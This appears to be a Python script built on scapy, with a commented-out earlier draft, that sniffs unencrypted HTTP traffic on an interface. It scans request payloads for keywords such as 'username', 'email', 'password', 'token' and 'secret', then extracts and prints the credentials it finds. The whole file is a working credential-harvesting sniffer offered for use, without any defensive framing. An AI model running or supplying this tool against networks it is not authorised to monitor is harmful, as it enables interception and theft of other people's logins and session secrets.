# import scapy.all as scapy
# from scapy.layers import http

# def sniff(interface):
#     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# def get_url(packet):
#     if packet.haslayer(http.HTTPRequest):
#         return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# def process_sniffed_packet(packet):
#     if packet.haslayer(http.HTTPRequest):
#         url = get_url(packet)
#         print(f"[+] HTTP request --> {url}")
#         if packet.haslayer(scapy.Raw):
#             print(packet[scapy.Raw].load)
# sniff("wlan0")





import scapy.all as scapy
from scapy.layers import http

keywords1 = [
    'username',  
    'email',     
    'login',     
    'auth',      
    'remember_me',  
    'session',
    'uname',
    "csrf"  ,
]


keywords2 = [
    "password", 
    "pwd", 
    "pass", 
    "token", 
    "secret",
    "input",
]

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter=" tcp port 80")

def get_url(packet):
    if packet.haslayer(http.HTTPRequest):
        return packet[http.HTTPRequest].Host.decode(errors="ignore") + packet[http.HTTPRequest].Path.decode(errors="ignore")

def process_sniffed_packet(packet):

    username = None
    password = None
 
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(f"[+] HTTP request --> {url}")
        

        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors='ignore')
            print(f"Raw Data: {load}")
            
            for keyword in keywords1:
                if keyword.lower() in load.lower():  
                    username = load.split(keyword + "=")[-1].split("&")[0]

            for keyword2 in keywords2:
                if keyword2.lower() in load.lower():
                    password = load.split(keyword2 + "=")[-1].split("&")[0]
            
            if username:
                print(f"[+] Possible Username Found: {username}")
            

            if password:
                print(f"[+] Possible Password Found: {password}")
            print(load.lower())
            print(keyword)
sniff("eth0")
